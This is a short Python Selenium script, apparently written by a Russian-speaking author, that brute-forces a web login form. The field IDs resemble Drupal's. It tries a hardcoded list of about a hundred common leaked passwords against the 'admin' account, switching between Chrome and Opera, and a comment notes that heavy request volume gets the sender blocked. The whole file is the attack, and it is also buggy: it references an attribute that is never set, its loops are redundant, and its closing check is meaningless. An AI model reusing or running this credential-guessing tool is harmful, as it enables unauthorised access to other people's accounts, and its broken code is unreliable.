# -*- coding:utf-8 -*-
from selenium import webdriver
from selenium.webdriver.chrome import service
from selenium.webdriver.common.keys import Keys
from time import sleep
import threading
'''Большое количество запросов кидает в блок'''

'''Класс драйвера и методов'''

class Driver():
    
    keys = ('123456, 12345, password, DEFAULT, 123456789, qwerty, 12345678, abc123, pussy, 1234567, 696969, ashley, fuckme, football, \
baseball, fuckyou, 111111, 1234567890, ashleymadison, password1, madison, asshole, superman, mustang, harley, 654321, 123123, hello, monkey, 0, \
hockey, letmein, 11111, soccer, cheater, \
kazuga, hunter, shadow, michael, 121212, 666666, iloveyou, qwertyuiop, secret, buster, horny, jordan, hosts, zxcvbnm, asdfghjkl, affair, dragon, \
987654, liverpool, bigdick, sunshine, yankees, asdfg, freedom, batman, \
whatever, charlie, fuckoff, money, pepper, jessica, asdfasdf, 1qaz2wsx, 987654321, \
andrew, qazwsx, dallas, 55555, 131313, abcd1234, anthony, steelers, \
asdfgh, jennifer, killer, cowboys, master, jordan23, robert, maggie, looking, \
thomas, george, matthew, 7777777, amanda, summer, qwert, princess, ranger, \
william, corvette, jackson, tigger, computer')
    
    def __init__(self,url,login):
            self.urls = url
            self.login = login
        
    def PasswordChekers(self):
        super
        keys = Driver.keys.split(', ')
        print (keys)
        
        for i in keys:
            for j in range(0,len(keys)):
                if j%2 == 0:
                    driver = webdriver.Chrome()
                    driver.get(self.urls)
                    elem = driver.find_element_by_id("edit-name")
                    elem.send_keys(self.login)
                    elem_2 = driver.find_element_by_id("edit-pass")
                    elem_2.send_keys(i)
                    result = driver.find_element_by_xpath("//*[@id='edit-submit']")
                    result.click()
                    sleep(1)
                    driver.close()
                else:
                    webdriver_service = service.Service()
                    webdriver_service.start()
                    driver = webdriver.Remote(webdriver_service.service_url, webdriver.DesiredCapabilities.OPERA)
                    driver.get(self.url)
                    elem = driver.find_element_by_id("edit-name")
                    elem.send_keys(self.login)
                    elem_2 = driver.find_element_by_id("edit-pass")
                    elem_2.send_keys(i)
                    result = driver.find_element_by_xpath("//*[@id='edit-submit']")
                    result.click()
                    sleep(1)
                    driver.close()
        assert "No results found." not in driver.page_source
    

instance = Driver('url','admin')
instance.PasswordChekers()